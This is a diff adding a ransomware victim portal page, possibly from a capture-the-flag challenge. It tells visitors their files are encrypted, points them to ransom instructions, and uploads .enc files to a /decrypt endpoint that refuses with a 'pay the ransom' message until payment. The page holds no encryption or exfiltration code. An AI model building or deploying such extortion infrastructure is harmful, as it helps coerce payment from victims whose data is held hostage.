@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Decrypt My Stuff!</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css">
+  </head>
+  <body>
+  <section class="section">
+    <div class="container" style="max-width: 780px">
+      <h1 class="title">
+        If you are seeing this, your files have been encrypted.
+      </h1>
+      <p class="subtitle">
+       <br/>Once you have paid the ransom (check your desktop wallpaper for information), please use the button below to decrypt your files.
+      </p>
+    </div>
+  </section>
+  <section class="section pt-0">
+    <div class="columns">
+      <div class="column is-6 is-offset-3">
+    <article class="is-fullwidth is-child notification is-info" style="max-width: 720px; margin: auto">
+    <label class="file-label">
+      <input id="file" class="file-input" type="file" accept=".enc">
+      <span class="file-cta has-text-centered has-background-success has-text-white-bis" style="width: 100%; flex-direction: column;">
+        <span class="file-label">
+          Decrypt file
+        </span>
+      </span>
+    </label>
+    <div id="result"></div>
+    </article>
+      </div></div>
+  </section>
+<script>
+function buf2hex(buffer) { // buffer is an ArrayBuffer
+  return [...new Uint8Array(buffer)]
+      .map(x => x.toString(16).padStart(2, '0'))
+      .join('');
+}
+
+const f = document.getElementById('file');
+let decrypt = function() {
+  const file = this.files[0];
+
+  const reader = new FileReader();
+  reader.onload = async function(evt) {
+    let data = new Uint8Array(evt.target.result);
+
+    let key_id = data.slice(0,16);
+    key_id = buf2hex(key_id);
+
+    data = data.slice(16);
+
+    document.getElementById('result').innerHTML = '';
+    let error = (e)=>{
+      document.getElementById('result').innerHTML = `
+      <div class="notification is-danger">
+        ${e}
+      </div>
+      `;
+    }
+
+    try {
+      let res = await fetch('/decrypt', {
+        method:'POST',
+        headers: {
+          key_id
+        },
+        body: data
+      });
+      if (res.status === 200) {
+        let dec_data = await res.blob();
+        let a = document.createElement('a');
+        a.setAttribute('href', URL.createObjectURL(dec_data));
+        a.setAttribute('download', file.name.split('.').slice(0,-1).join('.'));
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      } else if (res.status === 403) {
+        error(`You must pay the ransom before you can decrypt your file!`);
+      } else {
+        throw "bad";
+      }
+    } catch(e) {
+      error(`There was an error decrypting your file, please try again later!`);
+    }
+  }
+  reader.readAsArrayBuffer(file);
+}
+
+f.addEventListener('change', decrypt, false);
+</script>
+  </body>
+</html>
